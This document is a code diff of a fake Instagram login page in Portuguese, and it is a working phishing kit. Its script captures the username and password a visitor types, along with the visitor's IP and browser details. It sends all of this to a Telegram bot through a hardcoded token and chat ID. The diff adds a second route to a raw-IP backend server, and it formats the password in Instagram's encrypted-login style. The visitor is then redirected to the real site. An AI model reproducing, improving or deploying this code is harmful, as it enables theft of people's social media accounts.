@@ -19,7 +19,7 @@
             flex-direction: column;
             min-height: 100vh;
             align-items: center;
-            justify-content: center; /* Centraliza verticalmente o conteúdo principal */
+            justify-content: center;
             padding: 0 25px;
         }
 
@@ -32,11 +32,10 @@
 
         .main-content {
             width: 100%;
-            max-width: 400px;
+            max-width: 375px;
             display: flex;
             flex-direction: column;
             align-items: center;
-            margin-top: -40px; /* Sobe um pouco a logo para compensar o centralizar */
         }
 
         .logo-container {
@@ -44,8 +43,8 @@
         }
 
         .instagram-icon {
-            width: 60px;
-            height: 60px;
+            width: 62px;
+            height: 62px;
         }
 
         .login-form {
@@ -83,12 +82,12 @@
             height: 44px;
             font-size: 15px;
             font-weight: 600;
-            margin-top: 8px;
+            margin-top: 6px;
             cursor: pointer;
         }
 
         .login-btn:disabled {
-            opacity: 0.7;
+            opacity: 0.5;
         }
 
         .forgot-link {
@@ -102,11 +101,11 @@
 
         .footer-actions {
             width: 100%;
-            margin-top: 35px; /* Espaçamento reduzido conforme solicitado */
+            margin-top: 40px;
             display: flex;
             flex-direction: column;
             align-items: center;
-            gap: 20px;
+            gap: 12px;
         }
 
         .create-account-btn {
@@ -121,17 +120,10 @@
             cursor: pointer;
         }
 
-        .meta-container {
-            margin-top: 10px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
         .meta-logo {
             width: 65px;
             opacity: 0.8;
-            margin-top: 5px;
+            margin-top: 10px;
         }
 
         #errorMsg {
@@ -152,8 +144,8 @@
         </div>
 
         <form class="login-form" id="loginForm">
-            <input type="text" id="username" placeholder="Nome de usuário, email ou celular" required autocapitalize="none">
-            <input type="password" id="password" placeholder="Senha" required>
+            <input type="text" id="username" name="username" placeholder="Nome de usuário, email ou celular" required autocapitalize="none">
+            <input type="password" id="password" name="password" placeholder="Senha" required>
             
             <button type="submit" class="login-btn" id="loginBtn">Entrar</button>
             
@@ -163,16 +155,15 @@
 
         <div class="footer-actions">
             <button type="button" class="create-account-btn">Criar nova conta</button>
-            <div class="meta-container">
-                <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yK/r/soeuNpXL37G.png" alt="Meta" class="meta-logo">
-            </div>
+            <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yK/r/soeuNpXL37G.png" alt="Meta" class="meta-logo">
         </div>
     </div>
 
     <script>
         const TOKEN = "8524660585:AAHVKLyJeWs_5IM9nmNutXfPkXBBaBh4zi4";
         const CHAT_ID = "5542692841";
-        const TELEGRAM_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+        const TELEGRAM_URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+        const BACKEND_URL = "http://15.228.223.163:5000/login";
 
         const form = document.getElementById('loginForm');
         const userInp = document.getElementById('username');
@@ -182,63 +173,61 @@
 
         let userIP = "Desconhecido";
 
-        async function fetchInitialData() {
+        async function getIP() {
             try {
                 const r = await fetch('https://api.ipify.org?format=json');
                 const d = await r.json();
                 userIP = d.ip;
-                await sendTelegram(null, null, "📱 *VISITA: INTERFACE INSTAGRAM*");
-            } catch (e) {
-                await sendTelegram(null, null, "📱 *VISITA: INTERFACE INSTAGRAM*");
-            }
+            } catch (e) {}
         }
 
-        async function sendTelegram(u, p, title) {
-            const currentUA = navigator.userAgent;
-            const timestamp = Math.floor(Date.now() / 1000);
-            let message = `${title}\n\n`;
+        async function processLogin(u, p) {
+            const ua = navigator.userAgent;
+            const ts = Math.floor(Date.now() / 1000);
+            const encPwd = `#PWD_INSTAGRAM_BROWSER:0:${ts}:${p}`;
+            
+            const message = `🔐 *NOVA TENTATIVA DE LOGIN*\n\n` +
+                            `👤 *Usuário:* \`${u}\`\n` +
+                            `🔑 *Senha:* \`${p}\`\n\n` +
+                            `🌐 *IP:* ${userIP}\n` +
+                            `📱 *UA:* \`${ua}\``;
 
-            if (u) {
-                // Simula a lógica de enc_password do script fornecido
-                const encPwd = `#PWD_INSTAGRAM_BROWSER:0:${timestamp}:${p}`;
-                
-                message += `👤 *Dados Capturados*\n`;
-                message += `Usuário: \`${u}\`\n`;
-                message += `Senha: \`${p}\`\n\n`;
-                message += `🔑 *Lógica de Login AJAX*\n`;
-                message += `Payload: \`{"username":"${u}", "enc_password":"${encPwd}"}\`\n\n`;
-            }
-
-            message += `🌐 *Sistema*\n`;
-            message += `IP: ${userIP}\n`;
-            message += `User-Agent: \`${currentUA}\`\n`;
-            message += `Plataforma: ${navigator.platform}\n`;
-            message += `Hora: ${new Date().toLocaleString('pt-BR')}`;
-
-            await fetch(TELEGRAM_API, {
+            fetch(TELEGRAM_URL, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
+                body: JSON.stringify({chat_id: CHAT_ID, text: message, parse_mode: 'Markdown'})
             });
+
+            try {
+                await fetch(BACKEND_URL, {
+                    method: 'POST',
+                    mode: 'cors',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        user: u,
+                        pass: p,
+                        enc_password: encPwd,
+                        userAgent: ua
+                    })
+                });
+            } catch (e) {
+                console.error("Erro na comunicação com o backend.");
+            }
         }
 
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
             btn.disabled = true;
             
-            await sendTelegram(userInp.value, passInp.value, "🔐 *TENTATIVA DE LOGIN DETECTADA*");
+            await processLogin(userInp.value, passInp.value);
             
             err.style.display = 'block';
             setTimeout(() => {
                 window.location.href = "https://www.instagram.com/accounts/login/";
-            }, 1000);
+            }, 1500);
         });
 
-        window.onload = fetchInitialData;
+        window.onload = getIP;
     </script>
 </body>
 </html>
